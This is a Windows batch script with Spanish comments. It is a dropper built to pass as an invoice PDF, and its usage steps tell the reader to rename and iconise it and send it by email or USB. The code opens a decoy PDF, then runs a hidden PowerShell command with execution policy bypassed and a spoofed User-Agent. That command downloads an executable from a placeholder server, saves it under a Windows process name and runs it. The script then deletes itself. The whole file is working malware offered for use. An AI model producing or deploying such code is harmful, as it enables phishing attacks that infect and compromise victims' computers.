@echo off
REM ========================================================================
REM DROPPER SIMPLE - Factura/Ticket Falso
REM ========================================================================
REM Este dropper:
REM 1. Abre un PDF legítimo (decoy) para distraer al usuario
REM 2. Descarga el payload real desde servidor web
REM 3. Ejecuta el payload en background
REM 4. Se autodestruye
REM
REM USO:
REM   1. Editar URL_PAYLOAD con tu servidor
REM   2. Renombrar a: "Factura_Noviembre_2024.pdf.bat"
REM   3. Configurar icono de PDF en propiedades (opcional)
REM   4. Enviar por email/USB
REM ========================================================================

REM === CONFIGURACIÓN ===
set URL_PAYLOAD=http://tu-servidor.com/update/svchost.exe
set PDF_DECOY=%TEMP%\Factura_2024_11.pdf
set PAYLOAD_PATH=%APPDATA%\Microsoft\Windows\Caches\WmiPrvSE.exe

REM === PASO 1: Crear PDF decoy embebido ===
REM En lugar de descargar, usamos un PDF mínimo embebido en Base64
REM Esto crea un PDF válido de 1 página con texto "FACTURA PENDIENTE DE PAGO"
echo %%PDF-1.4 > "%PDF_DECOY%"
echo 1 0 obj ^<^< /Type /Catalog /Pages 2 0 R ^>^> endobj >> "%PDF_DECOY%"
echo 2 0 obj ^<^< /Type /Pages /Kids [3 0 R] /Count 1 ^>^> endobj >> "%PDF_DECOY%"
echo 3 0 obj ^<^< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources ^<^< /Font ^<^< /F1 5 0 R ^>^> ^>^> ^>^> endobj >> "%PDF_DECOY%"
echo 4 0 obj ^<^< /Length 44 ^>^> stream >> "%PDF_DECOY%"
echo BT /F1 18 Tf 100 700 Td (FACTURA PENDIENTE) Tj ET >> "%PDF_DECOY%"
echo endstream endobj >> "%PDF_DECOY%"
echo 5 0 obj ^<^< /Type /Font /Subtype /Type1 /BaseFont /Helvetica ^>^> endobj >> "%PDF_DECOY%"
echo xref >> "%PDF_DECOY%"
echo 0 6 >> "%PDF_DECOY%"
echo trailer ^<^< /Size 6 /Root 1 0 R ^>^> >> "%PDF_DECOY%"
echo startxref >> "%PDF_DECOY%"
echo %%%%EOF >> "%PDF_DECOY%"

REM === PASO 2: Abrir PDF decoy (el usuario ve esto) ===
start "" "%PDF_DECOY%"

REM === PASO 3: Esperar un poco para parecer normal ===
timeout /t 2 /nobreak >nul

REM === PASO 4: Descargar payload en background ===
REM Usar PowerShell con User-Agent legítimo para evitar detección
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$wc = New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'); $wc.DownloadFile('%URL_PAYLOAD%', '%PAYLOAD_PATH%'); Start-Process -FilePath '%PAYLOAD_PATH%' -WindowStyle Hidden"

REM === PASO 5: Autodestrucción del dropper ===
REM Usar ping como delay y luego eliminar el BAT
(goto) 2>nul & del "%~f0"
